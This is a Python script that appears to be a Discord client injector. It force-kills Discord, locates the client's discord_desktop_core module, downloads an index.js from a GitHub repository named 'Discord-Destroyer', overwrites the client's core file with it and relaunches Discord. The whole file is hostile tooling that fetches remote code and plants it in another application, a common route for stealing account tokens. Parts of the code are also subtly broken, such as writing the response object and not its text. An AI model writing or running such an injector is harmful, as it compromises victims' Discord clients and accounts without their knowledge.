import ntpath, os, re, time, subprocess, requests
from sys import argv


class Start:
    def __init__(self):
        Install()
        self.local = os.getenv("localappdata")
        self.startup_loc = ntpath.join(
            os.getenv("appdata"),
            "Microsoft",
            "Windows",
            "Start Menu",
            "Programs",
            "Startup",
        )
        self.discord = self.local + "\\Discord"
        Close()
        for d in os.listdir(ntpath.abspath(self.discord)):
            if re.match(r"app-(\d*\.\d*)*", d):
                self.app = ntpath.abspath(ntpath.join(self.discord, d))
                self.modules = ntpath.join(self.app, "modules")
                for dir in os.listdir(self.modules):
                    if re.match(r"discord_desktop_core-\d+", dir):
                        self.inj_path = (
                            self.modules + "\\" + dir + f"\\discord_desktop_core\\"
                        )
                        if ntpath.exists(self.inj_path):
                            if self.startup_loc not in argv[0]:
                                try:
                                    os.makedirs(
                                        self.inj_path + "initiation", exist_ok=True
                                    )
                                except PermissionError:
                                    pass
                            f = requests.get(
                                "https://raw.githubusercontent.com/DARKNOSY/Discord-Destroyer/main/Discord-Destroyer/src/index.js"
                            )
                            try:
                                with open(
                                    self.inj_path + "index.js", "w", errors="ignore"
                                ) as indexFile:
                                    indexFile.write(f)
                            except PermissionError:
                                pass
                            self.start_discord(dir)


    def start_discord(self, dir: str) -> None:
        local_app_data = os.getenv("localappdata")
        target_folder = "Discord" 
        folder_path = os.path.join(local_app_data, target_folder)
        os.chdir(folder_path)
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update, '--processStart', executable],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def Install():
    os.system("py -m pip install --upgrade requests")



def Close():
    for proc in os.popen('tasklist').readlines():
        if 'Discord.exe' in proc:
            pid = int(proc.split()[1])
            subprocess.run(['taskkill', '/F', '/PID', str(pid)])
            break
        time.sleep(3)


Start()
